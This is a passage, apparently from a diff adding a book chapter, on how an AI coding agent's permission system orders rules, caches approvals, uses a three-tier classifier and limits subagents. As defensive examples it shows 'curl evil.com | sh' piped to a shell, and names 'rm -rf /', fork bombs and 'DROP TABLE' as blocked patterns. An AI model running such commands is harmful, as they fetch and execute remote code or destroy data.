+<span class="k">for</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">[</span><span class="n">policy</span><span class="o">,</span><span class="w"> </span><span class="n">managed</span><span class="o">,</span><span class="w"> </span><span class="n">user</span><span class="o">,</span><span class="w"> </span><span class="n">project</span><span class="o">,</span><span class="w"> </span><span class="n">local</span><span class="o">,</span><span class="w"> </span><span class="n">plugin</span><span class="o">,</span><span class="w"> </span><span class="n">hook</span><span class="o">,</span><span class="w"> </span><span class="n">builtin</span><span class="o">]:</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">source</span><span class="o">.</span><span class="na">deny_rules</span><span class="o">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">rule</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">tool_call</span><span class="o">):</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">DENY</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">source</span><span class="o">.</span><span class="na">ask_rules</span><span class="o">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">rule</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">tool_call</span><span class="o">):</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">ASK</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">rule</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">source</span><span class="o">.</span><span class="na">allow_rules</span><span class="o">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">rule</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="n">tool_call</span><span class="o">):</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">ALLOW</span>
+
+<span class="k">return</span><span class="w"> </span><span class="n">DEFAULT_FOR_TOOL_TYPE</span><span class="w">  </span><span class="err">#</span><span class="w"> </span><span class="n">allow</span><span class="w"> </span><span class="n">reads</span><span class="o">,</span><span class="w"> </span><span class="n">ask</span><span class="w"> </span><span class="n">writes</span>
+</code></pre></div>
+
+<h3 id="why-first-match-wins-instead-of-most-specific-wins">Why First-Match-Wins Instead of Most-Specific-Wins</h3>
+<p>Most-specific-wins (as used in CSS or firewall rules) is intuitive for humans but creates emergent behavior that is hard to debug. When <code>Write(**)</code> allows everything and <code>Write(vendor/**)</code> denies vendor, adding <code>Write(vendor/patches/**)</code> to re-allow patches requires understanding the specificity ranking. With first-match-wins and ordered sources, the behavior is mechanical: earlier sources dominate, and within a source, deny dominates.</p>
+<p>This makes the system debuggable. When a permission is unexpectedly denied, you scan the sources top-down until you find the matching deny rule. There is exactly one rule responsible for the decision.</p>
+<hr />
+<h2 id="185-permission-caching-and-session-memory">18.5 Permission Caching and Session Memory</h2>
+<p>Evaluating rules for every tool call is fast (microseconds for pattern matching), but the user prompt that follows is not. If the same <code>git status</code> command triggers a prompt on every invocation, the system is broken from a UX perspective even though it is correct from a security perspective.</p>
+<h3 id="the-session-memory-cache">The Session Memory Cache</h3>
+<p>The session memory stores user decisions for the duration of a session. When the user approves <code>Bash(git diff *)</code>, the system extracts the pattern and caches it:</p>
+<div class="codehilite"><pre><span></span><code>Session Memory:
+  Bash(git <span class="gs">*)        → ALLOW  (user approved &quot;git diff&quot;, generalized to &quot;git *</span>&quot;)
+  Bash(npm test)     → ALLOW  (user approved exactly &quot;npm test&quot;)
+  Write(src/**)      → ALLOW  (user approved writing to src/foo.ts, generalized)
+</code></pre></div>
+
+<p>Pattern generalization is the key design decision. When the user approves <code>git diff --cached</code>, should the system cache:</p>
+<ol>
+<li>The exact command <code>git diff --cached</code> (too narrow --- the next <code>git diff</code> still prompts)</li>
+<li>The prefix <code>git diff *</code> (reasonable --- all git diff variants are similar in risk)</li>
+<li>The tool prefix <code>git *</code> (broad --- covers <code>git push --force</code> which is much riskier)</li>
+<li>The tool <code>Bash(*)</code> (too broad --- approves everything)</li>
+</ol>
+<p>The right answer depends on the command's risk profile. For read-only commands like <code>git diff</code>, generalizing to <code>git *</code> is safe because all git-read operations have similar risk. For write commands like <code>npm install</code>, caching only the exact command is safer because <code>npm install express</code> and <code>npm install &amp;&amp; curl evil.com | sh</code> have very different risk profiles.</p>
+<h3 id="cache-invalidation">Cache Invalidation</h3>
+<p>Session memory resets on:</p>
+<ul>
+<li>Session end (always)</li>
+<li><code>/clear</code> command (user-initiated context reset)</li>
+<li>Permission mode change (switching from default to auto invalidates default-mode approvals)</li>
+<li>Explicit revocation (user types "revoke Bash(git *)")</li>
+</ul>
+<p>Session memory does not persist across sessions. This is a deliberate security choice: a session compromise cannot permanently weaken the permission system. Every new session starts with a clean slate, and the user must re-approve patterns they use frequently. The friction is real but bounded --- after the first few approvals in a session, the cache covers most operations.</p>
+<h3 id="the-progressive-trust-concept">The Progressive Trust Concept</h3>
+<p>Session memory implements a form of progressive trust: the more the user interacts with the agent, the more permissions accumulate in the cache, and the fewer prompts appear. A fresh session asks about everything. A session that has been running for an hour rarely prompts because the user has approved all the patterns the agent uses.</p>
+<p>This is architecturally elegant because it aligns the permission granularity with the user's attention. At session start, the user is paying attention and evaluating each prompt carefully. An hour in, the user has established trust through repeated approvals and the system reflects that trust by not re-asking.</p>
+<p>The danger is session compromise: if the model starts making unexpected tool calls late in a long session (due to context pollution, prompt injection, or model drift), the accumulated permissions might auto-approve operations the user would not have approved if asked directly. The mitigations are:</p>
+<ol>
+<li><strong>Risk-based cache bypassing:</strong> High-risk operations always prompt, regardless of cache (Section 18.6).</li>
+<li><strong>Cache TTL:</strong> Optionally, cache entries expire after N minutes of inactivity.</li>
+<li><strong>Anomaly detection:</strong> Operations that differ significantly from the session's established patterns trigger fresh prompts even if the pattern technically matches.</li>
+</ol>
+<hr />
+<h2 id="186-the-auto-mode-ai-classifier">18.6 The Auto-Mode AI Classifier</h2>
+<p>Auto mode is where the permission system gets genuinely novel. Instead of asking the user, it asks a second LLM --- a classifier --- whether a tool call is safe enough to auto-approve.</p>
+<h3 id="why-this-is-architecturally-significant">Why This Is Architecturally Significant</h3>
+<p>Using an LLM as a security gate is a design pattern with profound implications. The classifier is:</p>
+<ul>
+<li><strong>Probabilistic, not deterministic.</strong> Two identical tool calls might get different decisions due to model temperature. This is acceptable because the classifier is a UX layer, not a security boundary.</li>
+<li><strong>Context-aware.</strong> Unlike pattern matching, the classifier can reason about the semantics of a command. It knows that <code>rm -rf ./build</code> (deleting a build directory) is vastly different from <code>rm -rf /</code> (deleting the filesystem), even though both match <code>rm -rf *</code>.</li>
+<li><strong>A separate model call.</strong> The classifier runs as a side-query --- a lightweight, fast-model call that does not interfere with the main conversation. This is architecturally critical: the classifier and the main agent use separate inference calls, separate context windows, and potentially separate models.</li>
+</ul>
+<h3 id="the-three-tier-classification-architecture">The Three-Tier Classification Architecture</h3>
+<p>The classifier is not a single component --- it is three classifiers stacked from cheap to expensive:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">flowchart</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">Tool</span><span class="p">[</span><span class="s">&quot;Tool Call&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">T1</span><span class="p">{</span><span class="s">&quot;Tier 1:&lt;br/&gt;Pattern Matching&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">T1</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Definitive</span><span class="w"> </span><span class="n">answer</span><span class="o">|</span><span class="w"> </span><span class="n">Done</span><span class="p">[</span><span class="s">&quot;Decision&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">T1</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Ambiguous</span><span class="o">|</span><span class="w"> </span><span class="n">T2</span><span class="p">{</span><span class="s">&quot;Tier 2:&lt;br/&gt;Heuristic Scoring&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">T2</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">High</span><span class="w"> </span><span class="n">confidence</span><span class="o">|</span><span class="w"> </span><span class="n">Done</span>
+<span class="w">    </span><span class="n">T2</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Low</span><span class="w"> </span><span class="n">confidence</span><span class="o">|</span><span class="w"> </span><span class="n">T3</span><span class="p">{</span><span class="s">&quot;Tier 3:&lt;br/&gt;LLM Classifier&lt;br/&gt;(side-query)&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">T3</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Done</span>
+
+<span class="w">    </span><span class="n">T1</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">T1N</span><span class="p">[</span><span class="s">&quot;Cost: ~0&lt;br/&gt;Latency: &lt;1ms&lt;br/&gt;Handles: 70% of calls&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">T2</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">T2N</span><span class="p">[</span><span class="s">&quot;Cost: ~0&lt;br/&gt;Latency: ~1ms&lt;br/&gt;Handles: 25% of calls&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">T3</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">T3N</span><span class="p">[</span><span class="s">&quot;Cost: ~$0.003&lt;br/&gt;Latency: 100-300ms&lt;br/&gt;Handles: 5% of calls&quot;</span><span class="p">]</span>
+</code></pre></div>
+
+<p><strong>Tier 1: Pattern Matching.</strong> Hardcoded lists of always-safe commands (<code>ls</code>, <code>cat</code>, <code>git status</code>, <code>cargo test</code>) and always-dangerous commands (<code>rm -rf /</code>, <code>DROP TABLE</code>, fork bombs). No computation, instant decisions. Handles ~70% of tool calls in a typical coding session.</p>
+<p><strong>Tier 2: Heuristic Scoring.</strong> Multi-factor risk scoring that considers command structure, referenced paths, flags, piping, and session history. Produces a confidence-weighted score compared against thresholds. Handles ~25% of calls.</p>
+<p><strong>Tier 3: LLM Classifier (Side-Query).</strong> A fast model (like Haiku or a fine-tuned classifier) receives the tool call, the working directory, and recent session context. It returns a structured decision: allow, soft-deny (suggest alternative), or deny. Handles the remaining ~5% of ambiguous calls.</p>
+<h3 id="the-side-query-architecture">The Side-Query Architecture</h3>
+<p>The classifier runs as a side-query: a separate inference call that does not share context with the main agent conversation.</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">sequenceDiagram</span>
+<span class="w">    </span><span class="nx">participant</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nx">Main</span><span class="w"> </span><span class="nx">Agent</span>
+<span class="w">    </span><span class="nx">participant</span><span class="w"> </span><span class="nx">Perm</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nx">Permission</span><span class="w"> </span><span class="nx">Engine</span>
+<span class="w">    </span><span class="nx">participant</span><span class="w"> </span><span class="nx">Class</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nx">Classifier</span><span class="w"> </span><span class="p">(</span><span class="nx">Side</span><span class="o">-</span><span class="nx">Query</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">participant</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nx">User</span>
+
+<span class="w">    </span><span class="nx">Agent</span><span class="o">-&gt;</span><span class="p">&gt;</span><span class="nx">Perm</span><span class="p">:</span><span class="w"> </span><span class="nx">Tool</span><span class="w"> </span><span class="nx">call</span><span class="p">:</span><span class="w"> </span><span class="nx">Bash</span><span class="p">(</span><span class="s">&quot;npm install lodash&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">Perm</span><span class="o">-&gt;</span><span class="p">&gt;</span><span class="nx">Perm</span><span class="p">:</span><span class="w"> </span><span class="nx">Tier</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">blocked</span><span class="o">/</span><span class="nx">safe</span><span class="w"> </span><span class="nx">list</span>
+<span class="w">    </span><span class="nx">Perm</span><span class="o">-&gt;</span><span class="p">&gt;</span><span class="nx">Perm</span><span class="p">:</span><span class="w"> </span><span class="nx">Tier</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="nx">Score</span><span class="w"> </span><span class="m m-Double">0.65</span><span class="w"> </span><span class="p">(</span><span class="nx">ambiguous</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">Perm</span><span class="o">-&gt;</span><span class="p">&gt;</span><span class="nx">Class</span><span class="p">:</span><span class="w"> </span><span class="nx">Side</span><span class="o">-</span><span class="nx">query</span><span class="p">:</span><span class="w"> </span><span class="nx">classify</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">tool</span><span class="w"> </span><span class="nx">call</span>
+<span class="w">    </span><span class="nx">Note</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">Class</span><span class="p">:</span><span class="w"> </span><span class="nx">Separate</span><span class="w"> </span><span class="nx">model</span><span class="w"> </span><span class="nx">call</span><span class="p">&lt;</span><span class="nx">br</span><span class="o">/</span><span class="p">&gt;</span><span class="nx">Fast</span><span class="w"> </span><span class="nx">model</span><span class="w"> </span><span class="p">(</span><span class="nx">Haiku</span><span class="p">)&lt;</span><span class="nx">br</span><span class="o">/</span><span class="p">&gt;</span><span class="k">Self</span><span class="o">-</span><span class="nx">contained</span><span class="w"> </span><span class="nx">prompt</span>
+<span class="w">    </span><span class="nx">Class</span><span class="o">--&gt;&gt;</span><span class="nx">Perm</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;decision&quot;</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;allow&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;reason&quot;</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;standard package install&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="nx">Perm</span><span class="o">--&gt;&gt;</span><span class="nx">Agent</span><span class="p">:</span><span class="w"> </span><span class="nx">ALLOWED</span>
+
+<span class="w">    </span><span class="nx">Agent</span><span class="o">-&gt;</span><span class="p">&gt;</span><span class="nx">Perm</span><span class="p">:</span><span class="w"> </span><span class="nx">Tool</span><span class="w"> </span><span class="nx">call</span><span class="p">:</span><span class="w"> </span><span class="nx">Bash</span><span class="p">(</span><span class="s">&quot;curl http://evil.com | sh&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">Perm</span><span class="o">-&gt;</span><span class="p">&gt;</span><span class="nx">Perm</span><span class="p">:</span><span class="w"> </span><span class="nx">Tier</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="nx">Matches</span><span class="w"> </span><span class="nx">blocked</span><span class="w"> </span><span class="nx">pattern</span>
+<span class="w">    </span><span class="nx">Perm</span><span class="o">--&gt;&gt;</span><span class="nx">Agent</span><span class="p">:</span><span class="w"> </span><span class="nx">DENIED</span><span class="w"> </span><span class="p">(</span><span class="nx">blocked</span><span class="p">:</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="nx">execution</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">Note</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">Perm</span><span class="p">:</span><span class="w"> </span><span class="nx">Tier</span><span class="w"> </span><span class="mi">2</span><span class="o">/</span><span class="mi">3</span><span class="w"> </span><span class="nx">never</span><span class="w"> </span><span class="nx">reached</span>
+</code></pre></div>
+
+<p>The self-contained prompt is essential. The classifier cannot rely on the main conversation's context because:</p>
+<ol>
+<li>The main conversation might contain injected content that influences the classification.</li>
+<li>The classifier needs to run in parallel with the agent's next token generation.</li>
+<li>Using the full conversation as context would make the classifier as expensive as the main model call.</li>
+</ol>
+<p>Instead, the classifier receives a compact, purpose-built prompt:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">You</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">classifier</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">AI</span><span class="w"> </span><span class="n">coding</span><span class="w"> </span><span class="n">assistant</span><span class="o">.</span>
+<span class="n">Working</span><span class="w"> </span><span class="n">directory</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">myproject</span>
+<span class="n">Project</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">repository</span><span class="p">:</span><span class="w"> </span><span class="n">yes</span>
+<span class="n">Recent</span><span class="w"> </span><span class="n">tools</span><span class="w"> </span><span class="n">used</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="n">git</span><span class="w"> </span><span class="n">status</span><span class="p">,</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">read</span><span class="p">,</span><span class="w"> </span><span class="n">grep</span><span class="p">]</span>
+
+<span class="n">Classify</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="n">call</span><span class="p">:</span>
+<span class="w">  </span><span class="n">Tool</span><span class="p">:</span><span class="w"> </span><span class="n">Bash</span>
+<span class="w">  </span><span class="n">Command</span><span class="p">:</span><span class="w"> </span><span class="n">npm</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">lodash</span>
+
+<span class="n">Respond</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">JSON</span><span class="p">:</span>
+<span class="p">{</span><span class="s2">&quot;decision&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;allow&quot;</span><span class="o">|</span><span class="s2">&quot;soft_deny&quot;</span><span class="o">|</span><span class="s2">&quot;deny&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;reason&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;one sentence&quot;</span><span class="p">}</span>
+</code></pre></div>
+
+<h3 id="the-soft_deny-decision">The <code>soft_deny</code> Decision</h3>
+<p>The three-way decision (allow/soft_deny/deny) is more useful than binary allow/deny. <code>soft_deny</code> means "this is not dangerous, but there is a safer alternative." Examples:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Decision</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>git push --force origin main</code></td>
+<td>soft_deny</td>
+<td>"Consider --force-with-lease for safer force pushing"</td>
+</tr>
+<tr>
+<td><code>chmod 777 ./deploy.sh</code></td>
+<td>soft_deny</td>
+<td>"Consider 755 --- 777 grants world-write access"</td>
+</tr>
+<tr>
+<td><code>pip install requests</code></td>
+<td>allow</td>
+<td>"Standard package installation"</td>
+</tr>
+<tr>
+<td><code>rm -rf /</code></td>
+<td>deny</td>
+<td>"Recursive deletion of root filesystem"</td>
+</tr>
+</tbody>
+</table>
+<p>When the classifier returns <code>soft_deny</code>, the system presents the suggestion to the user rather than silently denying. This creates a teaching moment --- the user learns about safer alternatives.</p>
+<h3 id="adaptive-risk-tolerance">Adaptive Risk Tolerance</h3>
+<p>The classifier does not use fixed thresholds. It maintains a risk tolerance parameter that adapts within the session:</p>
+<ul>
+<li><strong>Starts at 50</strong> (moderate tolerance)</li>
+<li><strong>Decreases by 10</strong> after each mistake (a tool call that the user subsequently flagged as wrong)</li>
+<li><strong>Increases by 2</strong> after every 10 consecutive successful auto-approvals</li>
+<li><strong>Three consecutive mistakes</strong> trigger a 5-minute cooldown where auto-mode is disabled</li>
+</ul>
+<p>The asymmetry is deliberate. One mistake wipes out the trust built by 50 successes. This implements a conservative ratchet: the system quickly becomes cautious after errors but slowly regains confidence.</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">graph</span><span class="w"> </span><span class="n">LR</span>
+<span class="w">    </span><span class="n">subgraph</span><span class="w"> </span><span class="n">Tolerance</span><span class="p">[</span><span class="s">&quot;Risk Tolerance Over Time&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">Start</span><span class="p">[</span><span class="s">&quot;Session Start&lt;br/&gt;Tolerance: 50&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="kr">Success</span><span class="p">[</span><span class="s">&quot;10 successes&lt;br/&gt;→ +2 = 52&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="kr">Success</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">Mistake</span><span class="p">[</span><span class="s">&quot;1 mistake&lt;br/&gt;→ -10 = 42&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">Mistake</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="kr">Recovery</span><span class="p">[</span><span class="s">&quot;50 more successes&lt;br/&gt;→ +10 = 52&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="kr">Recovery</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">ThreeMistakes</span><span class="p">[</span><span class="s">&quot;3 consecutive mistakes&lt;br/&gt;→ COOLDOWN 5min&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="kd">end</span>
+</code></pre></div>
+
+<h3 id="speculative-pre-classification">Speculative Pre-Classification</h3>
+<p>The most sophisticated optimization in the classifier pipeline is speculative pre-classification. When the agent begins generating a tool call (the model has emitted <code>tool_use</code> but has not yet finished the arguments), the system starts classifying the partial command.</p>
+<p>By the time the full command is ready, the classifier has often already finished. The speculative result is valid if the full command starts with the prefix that was classified. <code>cargo build --release</code> starts with <code>cargo</code>, and <code>cargo</code> was speculatively classified as a safe dev tool, so the speculative result applies.</p>
+<p>This hides the classifier's latency behind the model's token generation time. For the 5% of tool calls that reach Tier 3, speculative pre-classification reduces perceived latency from 100-300ms to near-zero.</p>
+<hr />
+<h2 id="187-permission-decisions-for-subagents">18.7 Permission Decisions for Subagents</h2>
+<p>When the main agent spawns a subagent (as discussed in Chapter 24), the subagent's permissions are a separate design challenge. Two principles govern subagent permissions:</p>
+<p><strong>No privilege escalation.</strong> A subagent cannot have more permissions than its parent. If the parent runs in default mode, the subagent cannot run in bypass mode. If the parent's rules deny <code>Write(.env)</code>, the subagent inherits that denial.</p>
+<p><strong>Clean permission slate.</strong> Session-memory approvals from the parent do not transfer to the subagent. If the user approved <code>Bash(git *)</code> in the parent session, the subagent does not inherit that approval. Each subagent starts with only the permissions explicitly granted in its definition.</p>
+<p>The rationale: session-memory represents the user's trust in the parent agent's judgment. That trust does not automatically extend to subagents, which may have different system prompts, different tool sets, and different behavioral tendencies.</p>
+<p><strong>Parent mode dominance.</strong> Certain parent modes take absolute precedence over subagent definitions. If the parent runs in auto mode with the AI classifier, all subagents also run under the classifier regardless of what their definition says. This prevents a subagent from downgrading its security level below what the parent enforces.</p>
+<hr />
+<h2 id="188-designing-permissions-that-scale">18.8 Designing Permissions That Scale</h2>
+<p>The permission system must work for a solo developer with a single project and for a Fortune 500 company with thousands of developers across hundreds of repositories. Here are the architectural patterns that enable this scale.</p>
+<h3 id="the-enterprise-override-pattern">The Enterprise Override Pattern</h3>
+<p>Enterprise administrators need a "nuclear option" that overrides everything. The policy source (Source 1) serves this role. When policy rules are present, they take absolute precedence over all other sources. A managed MCP configuration file, when present, can even replace the entire configuration, ensuring that only approved servers and tools are available.</p>
+<p>This is architecturally similar to MDM profiles on mobile devices: the organizational authority can restrict the device in ways that the user cannot override.</p>
+<h3 id="the-project-approval-gate">The Project Approval Gate</h3>
+<p>Project settings (Source 4) come from version control, which means they come from other people. A malicious contributor could commit settings that auto-approve dangerous operations. The defense is an approval gate: project-sourced rules require explicit user confirmation before they take effect.</p>
+<p>The first time the agent encounters a project's settings, it presents them to the user for review. The user's approval is stored in their user settings (Source 3), not in the project settings. This means:</p>
+<ul>
+<li>The approval persists across sessions.</li>
+<li>The approval is per-user, not per-project.</li>
+<li>A malicious project cannot approve itself.</li>
+<li>The approval survives project settings changes (the system re-prompts when settings change).</li>
+</ul>
+<h3 id="the-plugin-sandboxing-pattern">The Plugin Sandboxing Pattern</h3>
+<p>Plugins (Source 6) bring their own tools and need their own permissions. But plugins should not be able to weaken the security posture. The pattern:</p>
+<ol>
+<li>Plugin rules can only add allow rules, not deny rules.</li>
+<li>Plugin allow rules have lower priority than user, project, or local deny rules.</li>
+<li>Plugin tools are namespaced (e.g., <code>mcp__plugin_name__tool_name</code>) so rules can target them specifically.</li>
+</ol>
+<p>This means a plugin can say "I need <code>Bash(psql *)</code> to function," but if the user or project has denied <code>Bash(psql *)</code>, the plugin's request is overridden.</p>
+<hr />
+<h2 id="189-debugging-permission-decisions">18.9 Debugging Permission Decisions</h2>
+<p>A permission system that cannot be debugged is a permission system that will be bypassed. When a tool call is unexpectedly denied, the user needs to understand why.</p>
+<h3 id="the-decision-trace">The Decision Trace</h3>
+<p>Every permission decision should produce a trace that shows:</p>
+<ol>
+<li>The tool call that was evaluated</li>
+<li>The canonical form used for matching</li>
+<li>Each source that was consulted</li>
+<li>The first matching rule (and its source)</li>
+<li>The final decision</li>
+</ol>
+<div class="codehilite"><pre><span></span><code>Permission decision for: Bash(&quot;docker build -t myapp .&quot;)
+
+Source     | Rules Checked | Match?
+-----------|--------------|-------
+policy     | (none)       | -
+managed    | (none)       | -
+user       | deny: Bash(docker rm <span class="gs">*) | No match</span>
+<span class="gs">           | allow: Bash(docker build *</span>) | MATCH → ALLOW
+project    | (not reached) | -
+...
+
+Decision: ALLOW (source: user, rule: &quot;Bash(docker build *)&quot;)
+</code></pre></div>
+
+<p>This trace should be accessible via a debug command (e.g., <code>--permission-debug</code>) that logs every decision, and via a <code>why</code> command that replays the evaluation for a specific tool call.</p>
+<h3 id="common-debugging-scenarios">Common Debugging Scenarios</h3>
+<p><strong>"Why was this denied?"</strong> The trace shows the matching deny rule and its source. Often, it is a project-level deny rule that the user did not know about.</p>
+<p><strong>"Why was this not auto-approved?"</strong> In auto mode, the trace shows which classifier tier escalated the decision and why. "Tier 2 scored 0.62 (below 0.8 threshold)" tells the user that the heuristic classifier was not confident enough.</p>
+<p><strong>"Why does this keep prompting?"</strong> Session memory was not caching the pattern because the confidence was below the caching threshold. The user can add an explicit allow rule to their user settings.</p>
+<hr />
+<h2 id="1810-architectural-patterns-and-takeaways">18.10 Architectural Patterns and Takeaways</h2>
+<h3 id="pattern-layered-evaluation-with-short-circuiting">Pattern: Layered Evaluation with Short-Circuiting</h3>
+<p>The three-tier classifier and the eight-source rule cascade both use the same pattern: evaluate from cheapest/highest-priority to most-expensive/lowest-priority, short-circuiting as soon as a definitive answer is found. This pattern keeps average-case cost low while handling edge cases correctly.</p>
+<h3 id="pattern-probabilistic-layer-on-deterministic-foundation">Pattern: Probabilistic Layer on Deterministic Foundation</h3>
+<p>The AI classifier (probabilistic) sits on top of blocked command lists and rule patterns (deterministic). The deterministic layer handles the 95% of cases that are clearly safe or clearly dangerous. The probabilistic layer handles the 5% that require judgment. The deterministic layer is the security boundary; the probabilistic layer is the UX optimization.</p>
+<h3 id="pattern-conservative-ratchet">Pattern: Conservative Ratchet</h3>
+<p>The adaptive tolerance mechanism penalizes mistakes much more than it rewards successes. This is a general pattern for any system where the cost of a false positive (unnecessary prompt) is low and the cost of a false negative (unauthorized dangerous action) is high. Design the adaptation to fail safe: quick to restrict, slow to relax.</p>
+<h3 id="pattern-session-scoped-progressive-trust">Pattern: Session-Scoped Progressive Trust</h3>
+<p>Permissions accumulate during a session but reset between sessions. This aligns security posture with user attention: the user builds trust incrementally during active use, and that trust does not persist into future sessions where the context may be different.</p>
+<h3 id="the-fundamental-trade-off">The Fundamental Trade-off</h3>
+<p>No permission system eliminates risk. Every design choice trades one type of risk for another:</p>
+<table>
+<thead>
+<tr>
+<th>Tighter Permissions</th>
+<th>Looser Permissions</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>More prompts, more interruptions</td>
+<td>Fewer prompts, less friction</td>
+</tr>
+<tr>
+<td>Users bypass the system out of frustration</td>
+<td>Users trust the system and stay engaged</td>
+</tr>
+<tr>
+<td>False sense of security through "security theater"</td>
+<td>Real exposure to agent mistakes</td>
+</tr>
+<tr>
+<td>Slower development velocity</td>
+<td>Higher development velocity</td>
+</tr>
+</tbody>
+</table>
+<p>The goal is not zero risk. The goal is a system that makes the right trade-off for each user, each project, and each organization --- and makes that trade-off transparent and debuggable.</p>
+<hr />
+<h2 id="1811-cross-references">18.11 Cross-References</h2>
+<ul>
+<li><strong>Chapter 15:</strong> The Bash Tool covers the full shell parser that feeds command analysis into the permission system's pattern matching.</li>
+<li><strong>Chapter 17:</strong> The Trust Model defines the three trust domains that the permission system enforces.</li>
+<li><strong>Chapter 19:</strong> Bash Security Architecture covers the multi-layer security pipeline that runs <em>before</em> the permission system evaluates a bash command.</li>
+<li><strong>Chapter 20:</strong> Content Trust covers how untrusted content is prevented from influencing the permission system's decisions.</li>
+<li><strong>Chapter 24:</strong> Subagent Design Philosophy covers how subagent permissions are restricted relative to the parent.</li>
+<li><strong>Chapter 29:</strong> Hook Architecture covers how hook scripts participate in permission decisions as Source 7 in the rule hierarchy.</li>
+</ul>
+<hr />
+<h2 id="summary">Summary</h2>
